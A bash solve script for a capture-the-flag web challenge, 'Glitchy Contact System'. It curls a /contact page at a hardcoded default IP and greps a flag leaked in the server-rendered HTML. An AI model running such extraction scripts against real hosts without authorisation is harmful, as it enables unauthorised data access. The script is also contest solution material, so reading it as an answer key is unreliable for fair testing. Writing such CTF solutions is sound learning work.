#!/usr/bin/env bash
# solve-web5-glitchy-contact.sh — riffhack web5 (Glitchy Contact System)
#
# The /contact page's client component throws `new Error("...FLAG=" + flag)`
# on mount. The `flag` prop is already in the SSR HTML before any JS runs.
#
# Usage: solve-web5-glitchy-contact.sh <host>
set -euo pipefail

HOST="${1:-159.89.230.27}"
echo "[*] web5 (Glitchy Contact System) against $HOST"

flag=$(curl -sk "http://$HOST/contact" | grep -oE 'bitflag\{[^}]+\}' | head -1)

if [[ -n "$flag" ]]; then
  echo "[+] FLAG: $flag"
else
  echo "[-] flag prop not found in /contact SSR HTML" >&2
  exit 1
fi
